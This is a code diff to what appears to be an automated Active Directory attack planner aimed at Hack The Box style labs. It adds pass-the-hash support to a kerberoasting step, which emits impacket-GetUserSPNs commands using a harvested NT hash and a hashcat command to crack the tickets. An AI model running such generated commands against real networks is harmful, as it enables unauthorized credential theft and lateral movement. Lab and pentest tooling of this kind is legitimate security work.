@@ -552,15 +552,33 @@ def run(report, store, ui=None):
     # can swap to a stronger cred later if needed.
     _kb_owner = "<owned-user>"
     _kb_pw = "<password>"
+    _kb_hash = ""
     if e.creds:
         ((_owned_lc, _owned_pw), _occs) = next(iter(e.creds.items()))
         _kb_owner = _occs[0][0] if _occs[0][0] != "<user>" else _owned_lc
         _kb_pw = _owned_pw
+    elif e.nt:
+        # iter-105: fall back to any NT hash whose user is known - kerberoast
+        # only needs any authenticated request, so a machine account hash
+        # (very common HTB pattern) triggers R9 too.
+        for _h, _occs in e.nt.items():
+            for _hu, _hs, _hl in _occs:
+                if _hu:
+                    _kb_owner = _hu
+                    _kb_hash = _h
+                    break
+            if _kb_hash:
+                break
     for u in e.kerberoastable:
+        # iter-105: switch to -hashes form when we only have an NT hash.
+        _kb_uri = (f"{dom}/{_kb_owner}" if _kb_hash
+                   else f"{dom}/{_kb_owner}:{_kb_pw}")
+        _kb_hash_flag = (f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{_kb_hash}'"
+                         if _kb_hash else "")
         chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
             crit=6, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
             commands=[f"impacket-GetUserSPNs -request-user '{u}' -dc-ip {dc()} "
-                      f"{dom}/{_kb_owner}:{_kb_pw}",
+                      f"{_kb_uri}{_kb_hash_flag}",
                       f"hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
             src="bloodhound"))
     if e.has_tgs:
